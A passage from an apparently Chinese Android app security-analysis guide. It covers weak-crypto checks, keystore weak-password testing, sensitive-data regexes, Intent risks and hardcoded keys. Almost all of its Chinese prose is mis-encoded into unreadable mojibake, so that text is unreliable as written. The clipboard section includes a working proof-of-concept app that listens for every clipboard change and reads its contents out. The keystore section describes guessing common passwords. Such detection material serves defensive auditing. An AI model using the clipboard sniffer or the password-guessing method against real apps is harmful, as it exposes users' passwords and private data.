<p>Androidåº”ç”¨é€šå¸¸ä½¿ç”¨PF_UNIXï¼ŒPF_INETï¼ŒPF_NETLINKç­‰ä¸åŒdomainçš„socketæ¥è¿›è¡Œæœ¬åœ°IPCæˆ–è€…è¿œç¨‹ç½‘ç»œé€šä¿¡ï¼Œè¿™äº›æš´éœ²åœ¨socketä»£è¡¨äº†æ½œåœ¨çš„æœ¬åœ°æˆ–è€…è¿œç¨‹æ”»å‡»é¢ï¼Œå†å²ä¸Šä¹Ÿå‡ºç°è¿‡ä¸å°‘åˆ©ç”¨socketè¿›è¡Œæ‹’ç»æœåŠ¡ï¼Œrootææƒæˆ–è€…è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ¡ˆä¾‹ï¼Œç‰¹åˆ«æ˜¯PF_INETç±»å‹çš„ç½‘ç»œsocketï¼Œå¯ä»¥é€šè¿‡ç½‘ç»œä¸Androidåº”ç”¨é€šä¿¡ï¼Œå…¶åŸæœ¬ç”¨äºlinuxç¯å¢ƒä¸‹å¼€æ”¾ç½‘ç»œæœåŠ¡ï¼Œç”±äºç¼ºä¹å¯¹ç½‘ç»œè°ƒç”¨è€…èº«ä»½æˆ–è€…æœ¬åœ°è°ƒç”¨è€…idï¼Œpermissionç­‰ç»†ç²’åº¦çš„å®‰å…¨æ£€æŸ¥æœºåˆ¶ï¼Œåœ¨å®ç°ä¸å½“çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥çªç ´Androidæ²™ç®±é™åˆ¶ï¼Œä»¥è¢«æ”»å‡»åº”ç”¨çš„æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œé€šå¸¸å‡ºç°æ¯”è¾ƒä¸¥é‡çš„æ¼æ´</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±</p>
<p><strong>å»ºè®®</strong></p>
<p>ç›´æ¥ä¼ é€’å‘½ä»¤å­—æˆ–è€…é—´æ¥å¤„ç†æœ‰æ•æ„Ÿä¿¡æ¯æˆ–æ“ä½œæ—¶ï¼Œé¿å…ä½¿ç”¨socketå®ç°ï¼Œä½¿ç”¨èº«ä»½è®¤è¯ï¼Œé‰´æƒï¼Œå‚æ•°æ ¡éªŒç­‰å®‰å…¨è¦ç´ ã€‚</p>
<h2 id="å¼±åŠ å¯†é£é™©æ£€æµ‹">å¼±åŠ å¯†é£é™©æ£€æµ‹</h2>
<h3 id="DESå¼±åŠ å¯†ç®—æ³•é£é™©æ£€æµ‹">DESå¼±åŠ å¯†ç®—æ³•é£é™©æ£€æµ‹</h3>
<p>å®‰å…¨æ€§è¦æ±‚é«˜çš„åº”ç”¨ç¨‹åºå¿…é¡»é¿å…ä½¿ç”¨ä¸å®‰å…¨çš„æˆ–è€…å¼ºåº¦å¼±çš„åŠ å¯†ç®—æ³•ã€‚ä¾‹å¦‚ï¼Œæ•°æ®åŠ å¯†æ ‡å‡†ç®—æ³•DES(å¯†é’¥é»˜è®¤æ˜¯56ä½ï¼Œç®—æ³•åŠå…¬å¼€ï¼Œè¿­ä»£æ¬¡æ•°å°‘)æ˜¯æåº¦ä¸å®‰å…¨çš„ã€‚</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±</p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p>
<p>ä½¿ç”¨deså¼±åŠ å¯†ç®—æ³•ï¼Œé£é™©ä»£ç æ ·ä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;DES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES/ECB/PKCS5Padding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼&quot;DES/(\w){3}/.+Padding&quot;åŒ¹é…å­—ç¬¦ä¸²å¸¸é‡ã€‚</p>
<p><strong>å»ºè®®ï¼š</strong></p>
<p>å»ºè®®ä½¿ç”¨å®‰å…¨æ€§æ›´é«˜çš„AESåŠ å¯†ç®—æ³•</p>
<h3 id="ä¸å®‰å…¨çš„å¯†é’¥é•¿åº¦é£é™©æ£€æµ‹">ä¸å®‰å…¨çš„å¯†é’¥é•¿åº¦é£é™©æ£€æµ‹</h3>
<p>åœ¨ä½¿ç”¨RSAåŠ å¯†æ—¶ï¼ŒåŠ å¯†é•¿åº¦å°äº512bitï¼Œå°äº512bitçš„å¯†é’¥å¾ˆå®¹æ˜“è¢«ç ´è§£ï¼Œè®¡ç®—å‡ºå¯†é’¥</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> KeyPair <span class="title function_">getRSAKey</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">    <span class="type">KeyPairGenerator</span> <span class="variable">keyGen</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">    keyGen.initialize(<span class="number">512</span>);</span><br><span class="line">    <span class="type">KeyPair</span> <span class="variable">key</span> <span class="operator">=</span> keyGen.generateKeyPair();</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯¹åº”çš„smaliä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;getInstance(Ljava<span class="regexp">/lang/</span>String;)Ljava<span class="regexp">/security/</span>KeyPairGenerator;</span><br><span class="line"></span><br><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;initialize(I)V</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡åŒ¹é…ä¸Šè¿°å‡½æ•°ï¼Œå¹¶æ ¹æ®initializeå‡½æ•°çš„å‚æ•°å€¼åˆ¤æ–­ã€‚</p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<p>åœ¨ä½¿ç”¨RSAåŠ å¯†æ—¶ï¼Œå»ºè®®å¯†é’¥é•¿åº¦å¤§äº1024bit</p>
<h3 id="AES-ECBå¼±åŠ å¯†é£é™©æ£€æµ‹">AES-ECBå¼±åŠ å¯†é£é™©æ£€æµ‹</h3>
<p>AESçš„ECBåŠ å¯†æ¨¡å¼å®¹æ˜“é­åˆ°å­—å…¸æ”»å‡»ï¼Œå®‰å…¨æ€§ä¸å¤Ÿ</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<p>ç¬¬ä¸€æ­¥ï¼Œæ£€æµ‹ä»¥ä¸‹å‡½æ•°ï¼š</p>
<ul>
<li>getInstance(String transformation)</li>
<li>getInstance(String transformation, String provider)</li>
<li>getInstance(String transformation, Provider provider)</li>
</ul>
<p>ç¬¬äºŒæ­¥ï¼Œæ£€æµ‹ä¸Šè¿°å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°å€¼å‡ºç°ä»¥ä¸‹æƒ…å†µçš„ä»»æ„ä¸€ç§ï¼Œå³å¯è®¤ä¸ºè¯¥æ£€æµ‹é¡¹ä¸å®‰å…¨ï¼Œæ ‡è®°ä¸º<code>ä½å±</code>ã€‚</p>
<ul>
<li>â€œAESâ€ï¼ŒAndroidæä¾›çš„AESåŠ å¯†ç®—æ³•APIé»˜è®¤ä½¿ç”¨ECBæ¨¡å¼</li>
<li>â€œDESâ€ï¼ŒDESé»˜è®¤æ˜¯56ä½åŠ å¯†å¯†é’¥ï¼Œå·²ç»ä¸å®‰å…¨</li>
<li>â€œAES/ECB/xxxâ€</li>
<li>â€œDES/ECB/xxxâ€</li>
<li>â€œDESede/ECB/xxxâ€</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(keyBytes, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS7Padding&quot;</span>, <span class="string">&quot;BC&quot;</span>);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>å»ºè®®</strong></p>
<p>é¿å…ä½¿ç”¨ECBæ¨¡å¼ï¼Œå»ºè®®ä½¿ç”¨CBCæ¨¡å¼</p>
<h3 id="IVParameterSpecä¸å®‰å…¨åˆå§‹åŒ–å‘é‡æ£€æµ‹">IVParameterSpecä¸å®‰å…¨åˆå§‹åŒ–å‘é‡æ£€æµ‹</h3>
<p>ä½¿ç”¨IVParameterSpecå‡½æ•°ï¼Œå¦‚æœä½¿ç”¨äº†å›ºå®šçš„åˆå§‹åŒ–å‘é‡ï¼Œé‚£ä¹ˆå¯†ç æ–‡æœ¬å¯é¢„æµ‹æ€§é«˜å¾—å¤šï¼Œå®¹æ˜“æ”¶åˆ°å­—å…¸æ”»å‡»ã€‚</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<p>åˆå§‹åŒ–å‘é‡æ—¶ï¼Œä½¿ç”¨äº†ç¡¬ç¼–ç åˆ°ç¨‹åºçš„å¸¸é‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] iv = &#123; <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line"><span class="type">IvParameterSpec</span> <span class="variable">ips</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv)</span><br></pre></td></tr></table></figure>
<p>åŒ¹é…<code>Ljavax/crypto/spec/IvParameterSpec;-&gt;&lt;init&gt;([B)V</code>å‡½æ•°</p>
<p><strong>å»ºè®®</strong></p>
<p>IVParameterSpecåˆå§‹åŒ–æ—¶ï¼Œä¸ä½¿ç”¨å¸¸é‡vectorã€‚</p>
<h3 id="RSAä¸­ä¸ä½¿ç”¨Paddingé£é™©æ£€æµ‹">RSAä¸­ä¸ä½¿ç”¨Paddingé£é™©æ£€æµ‹</h3>
<p>ä½¿ç”¨RSAå…¬é’¥æ—¶é€šå¸¸ä¼šç»‘å®šä¸€ä¸ªpaddingï¼ŒåŸå› æ˜¯ä¸ºäº†é˜²æ­¢ä¸€äº›ä¾èµ–äºno paddingæ—¶å¯¹RSAç®—æ³•çš„æ”»å‡»</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">rsa</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    rsa = javax.crypto.Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (java.security.NoSuchAlgorithmException e) &#123;&#125;</span><br><span class="line">  <span class="keyword">catch</span> (javax.crypto.NoSuchPaddingException e) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;RSA&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>ç”¨æ­£åˆ™è¡¨è¾¾å¼<code>RSA/(\w)&#123;3&#125;/NoPadding</code>åŒ¹é…å­—ç¬¦ä¸²å¸¸é‡</p>
<p><strong>å»ºè®®ï¼š</strong></p>
<p>å»ºè®®ä½¿ç”¨Paddingæ¨¡å¼ã€‚</p>
<h3 id="KeyStoreå¼±å¯†ç é£é™©æ£€æµ‹">KeyStoreå¼±å¯†ç é£é™©æ£€æµ‹</h3>
<p>keytoolæ˜¯ä¸€ä¸ªjavaæ•°æ®è¯ä¹¦çš„ç®¡ç†å·¥å…·ï¼Œ</p>
<p>keytoolå°†å¯†é’¥(keyï¼Œç§é’¥å’Œå…¬é’¥é…å¯¹)å’Œè¯ä¹¦(certificates)å­˜åœ¨ä¸€ä¸ªç§°ä¸ºkeystoreçš„æ–‡ä»¶ä¸­ï¼Œå¹¶é€šè¿‡å¯†ç ä¿æŠ¤keystoreä¸­çš„å¯†é’¥ã€‚å¦‚æœå¯†ç è®¾ç½®è¿‡äºç®€å•ï¼Œä¾‹å¦‚ï¼š123456ã€androidç­‰ï¼Œåˆ™ä¼šå¯¼è‡´keystoreæ–‡ä»¶çš„ç§é’¥æ³„éœ²ï¼Œä»è€Œå¯¼è‡´ä¸€ç³»åˆ—çš„ä¿¡æ¯æ³„éœ²é£é™©ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>é«˜å±</code></p>
<p><strong>æ£€æµ‹æ–¹æ³•</strong></p>
<p>æ–¹æ³•ä¸€ï¼‰åŸºäºkeytoolå‘½ä»¤è¡Œæ£€æµ‹ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">keytool</span> -list -keystore <span class="literal">debug</span>.keystore</span><br></pre></td></tr></table></figure>
<p>ç„¶åè¾“å…¥ä¸å®‰å…¨çš„å¼±å¯†ç ï¼Œè‹¥æ­£å¸¸è¾“å‡ºï¼Œè¡¨æ˜è¯¥keystoreæ–‡ä»¶å­˜åœ¨å¼±å¯†ç é£é™©</p>
<p>ï¼ˆæ–¹æ³•äºŒï¼‰åŸºäºpyjksçš„ç¬¬ä¸‰æ–¹pythonè§£æåº“</p>
<p>å®‰è£…<code>pip install pyjks</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_keystore_pwd</span>(<span class="params">self, jks_file, pwd</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jks.KeyStore.load(jks_file, pwd)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åé€šè¿‡å¸¸è§çš„å¼±å¯†ç ç»„åˆè¿›è¡Œpayloadæµ‹è¯•ã€‚</p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<p>æé«˜keystoreä¿æŠ¤å¯†ç çš„å¼ºåº¦ã€‚</p>
<h2 id="æ•°æ®å®‰å…¨æ£€æµ‹">æ•°æ®å®‰å…¨æ£€æµ‹</h2>
<h3 id="æ•æ„Ÿä¿¡æ¯æ£€æµ‹">æ•æ„Ÿä¿¡æ¯æ£€æµ‹</h3>
<p>é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ•æ„Ÿä¿¡æ¯</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„å‡ ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒ¹é…é‚®ç®±åœ°å€ï¼Œæ‰‹æœºå·ï¼Œç”µè¯å·ç ï¼Œèº«ä»½è¯å’Œqqç­‰æ•æ„Ÿçš„ä¿¡æ¯ï¼Œçœ‹æ˜¯å¦æœ‰åœ¨ä»£ç ä¸­å‡ºç°ï¼Œæé†’å¼€å‘è€…æ³¨æ„è¿™äº›æ•æ„Ÿä¿¡æ¯ï¼Œé˜²æ­¢ä¸å¿…è¦çš„å¤–æ³„</p>
<p>é‚®ç®±åœ°å€</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp5</span> <span class="operator">=</span> <span class="string">&quot;[<span class="char escape_">\w</span>.-]+@[<span class="char escape_">\w</span>-]+<span class="char escape_">\.</span>[<span class="char escape_">\w</span>.]+&quot;</span></span><br></pre></td></tr></table></figure>
<p>æ‰‹æœºå·</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp6 = &quot;^(<span class="number">13</span>[<span class="number">0</span>-<span class="number">9</span>]|<span class="number">14</span>[<span class="number">5</span>|<span class="number">7</span>]|<span class="number">15[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>]|<span class="number">18[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>])\d&#123;<span class="number">8</span>&#125;$&quot;</span><br></pre></td></tr></table></figure>
<p>ç”µè¯å·ç </p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp7</span> <span class="operator">=</span> <span class="string">&quot;<span class="char escape_">\d</span>&#123;3&#125;-<span class="char escape_">\d</span>&#123;8&#125;|<span class="char escape_">\d</span>&#123;4&#125;-<span class="char escape_">\d</span>&#123;7&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>èº«ä»½è¯å·</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp8</span> <span class="operator">=</span> <span class="string">&quot;^<span class="char escape_">\d</span>&#123;15&#125;|<span class="char escape_">\d</span>&#123;18&#125;$&quot;</span></span><br></pre></td></tr></table></figure>
<p>QQå·</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">regexp9</span> <span class="operator">=</span> <span class="string">&quot;[1-9][0-9]&#123;4,&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="å‰ªè´´æ¿æ•æ„Ÿä¿¡æ¯æ³„éœ²é£é™©æ£€æµ‹">å‰ªè´´æ¿æ•æ„Ÿä¿¡æ¯æ³„éœ²é£é™©æ£€æµ‹</h3>
<p>ç”±äºAndroidå‰ªè´´æ¿çš„å†…å®¹å‘ä»»ä½•æƒé™çš„appå¼€æ”¾ï¼Œå¾ˆå®¹æ˜“è¢«å—…æ¢æ³„å¯†ï¼ŒåŒä¸€éƒ¨æ‰‹æœºä¸­å®‰è£…çš„å…¶ä»–appï¼Œç”šè‡³æ˜¯ä¸€äº›æƒé™ä¸é«˜çš„appï¼Œéƒ½å¯ä»¥é€šè¿‡å‰ªè´´æ¿åŠŸèƒ½è·å–å‰ªè´´æ¿ä¸­çš„æ•æ„Ÿä¿¡æ¯</p>
<p>**é£é™©ç­‰çº§ï¼š**æé†’</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">clipBtn = (Button) findViewById(R.id.btn_clip);</span><br><span class="line">clipBtn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">	</span><br><span class="line">		<span class="type">ClipboardManager</span> <span class="variable">clipboard</span> <span class="operator">=</span> (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClipData</span> <span class="variable">clip1</span> <span class="operator">=</span> ClipData.newPlainText(<span class="string">&quot;label&quot;</span>,<span class="string">&quot;password=123456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clipboard.setPrimaryClip(clip1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>æ¼æ´å¯ä»¥åˆ©ç”¨å¦‚ä¸‹ä»£ç åˆ©ç”¨ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">		<span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">		<span class="type">ClipboardManager</span> <span class="variable">clipBoard</span> <span class="operator">=</span> (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line">		clipBoard.addPrimaryClipChangedListener( <span class="keyword">new</span> <span class="title class_">ClipboardListener</span>() );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">ClipboardManager</span> <span class="variable">cm</span> <span class="operator">=</span> (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line">		<span class="type">ClipData</span> <span class="variable">cd2</span> <span class="operator">=</span> cm.getPrimaryClip();</span><br><span class="line">		<span class="type">String</span> <span class="variable">clipText</span> <span class="operator">=</span> cd2.getItemAt(<span class="number">0</span>).getText().toString();</span><br><span class="line">		<span class="comment">//Log.v(&quot;clipboard&quot;, &quot;Attacked: &quot; + clipText);</span></span><br><span class="line">		Toast.makeText(getApplicationContext(), <span class="string">&quot;Attacked: &quot;</span> + clipText, Toast.LENGTH_LONG).show();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">ClipboardListener</span> <span class="keyword">implements</span> <span class="title class_">ClipboardManager</span>.OnPrimaryClipChangedListener &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPrimaryClipChanged</span><span class="params">()</span> &#123;</span><br><span class="line">		   attack();</span><br><span class="line">	   &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>å»ºè®®ï¼š</strong></p>
<p>é¿å…ä½¿ç”¨å‰ªè´´æ¿æ˜æ–‡å­˜å‚¨æ•æ„Ÿä¿¡æ¯æˆ–è¿›è¡ŒåŠ å¯†ã€‚</p>
<h3 id="Intentæ•æ„Ÿæ•°æ®æ³„éœ²é£é™©æ£€æµ‹">Intentæ•æ„Ÿæ•°æ®æ³„éœ²é£é™©æ£€æµ‹</h3>
<p>APPåˆ›å»ºIntentä¼ é€’æ•°æ®åˆ°å…¶ä»–Activityï¼Œå¦‚æœåˆ›å»ºçš„Activityä¸æ˜¯åœ¨åŒä¸€ä¸ªTaskä¸­æ‰“å¼€ï¼Œå°±å¾ˆå¯èƒ½è¢«å…¶ä»–çš„ActivityåŠ«æŒè¯»å–åˆ°Intentå†…å®¹ï¼Œè·¨Taskçš„Activityé€šè¿‡Intentä¼ é€’æ•æ„Ÿä¿¡æ¯æ˜¯ä¸å®‰å…¨çš„ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<p>æ£€æµ‹æ˜¯å¦ä½¿ç”¨äº†FLAG_ACTIVITY_NEW_TASKæ ‡å¿—ã€‚</p>
<p><strong>å»ºè®®ï¼š</strong></p>
<p>å°½é‡é¿å…ä½¿ç”¨åŒ…å«FLAG_ACTIVITY_NEW_TASKæ ‡å¿—çš„Intentæ¥ä¼ é€’æ•æ„Ÿä¿¡æ¯ã€‚</p>
<h3 id="PendingIntentè¯¯ç”¨é£é™©">PendingIntentè¯¯ç”¨é£é™©</h3>
<p>ä½¿ç”¨pendingIntentæ—¶å€™ï¼Œå¦‚æœä½¿ç”¨äº†ä¸€ä¸ªç©ºIntentï¼Œä¼šå¯¼è‡´æ¶æ„ç”¨æˆ·åŠ«æŒIntentçš„å†…å®¹ã€‚ç¦æ­¢ä½¿ç”¨ç©ºintentå»æ„é€ pendingIntentã€‚</p>
<p>é£é™©ç­‰çº§ï¼š<code>ä¸­å±</code></p>
<p>é—®é¢˜ç¤ºä¾‹ï¼š</p>
<p>é€šè¿‡åˆ¤æ–­ä»£ç ç‰‡æ®µä¸­æœ‰æ²¡æœ‰å‡ºç°ä»¥ä¸‹å‡½æ•°ï¼Œå³å¯çŸ¥é“æ˜¯å¦ä½¿ç”¨äº†ç©ºintentæ„é€ PendingIntentã€‚</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240920195326209.png" alt="image-20240920195326209"></p>
<p><strong>å»ºè®®ï¼š</strong></p>
<p>ç¦æ­¢ä½¿ç”¨ç©ºintentå»æ„é€ pendingIntentã€‚</p>
<h3 id="å¯†é’¥ç¡¬ç¼–ç é£é™©æ£€æµ‹">å¯†é’¥ç¡¬ç¼–ç é£é™©æ£€æµ‹</h3>
<p>å°†å¯†é’¥ç¡¬ç¼–ç åœ¨Javaä»£ç ã€æ–‡ä»¶ä¸­ï¼Œè¿™æ ·åšä¼šå¼•èµ·å¾ˆå¤§é£é™©ã€‚<strong>ä¿¡æ¯å®‰å…¨çš„åŸºç¡€åœ¨äºå¯†ç å­¦ï¼Œè€Œå¸¸ç”¨çš„å¯†ç å­¦ç®—æ³•éƒ½æ˜¯å…¬å¼€çš„ï¼ŒåŠ å¯†å†…å®¹çš„ä¿å¯†ä¾é çš„æ˜¯å¯†é’¥çš„ä¿å¯†</strong>ï¼Œå¯†é’¥å¦‚æœæ³„éœ²ï¼Œå¯¹äºå¯¹ç§°å¯†ç ç®—æ³•ï¼Œæ ¹æ®ç”¨åˆ°çš„å¯†é’¥ç®—æ³•å’ŒåŠ å¯†åçš„å¯†æ–‡ï¼Œå¾ˆå®¹æ˜“å¾—åˆ°åŠ å¯†å‰çš„æ˜æ–‡ï¼›å¯¹äºéå¯¹ç§°å¯†ç ç®—æ³•æˆ–è€…ç­¾åç®—æ³•ï¼Œæ ¹æ®å¯†é’¥å’Œè¦åŠ å¯†çš„æ˜æ–‡ï¼Œå¾ˆå®¹æ˜“è·å¾—è®¡ç®—å‡ºç­¾åå€¼ï¼Œä»è€Œä¼ªé€ ç­¾åã€‚</p>
<p>é£é™©ç­‰çº§ï¼š<code>æé†’</code></p>
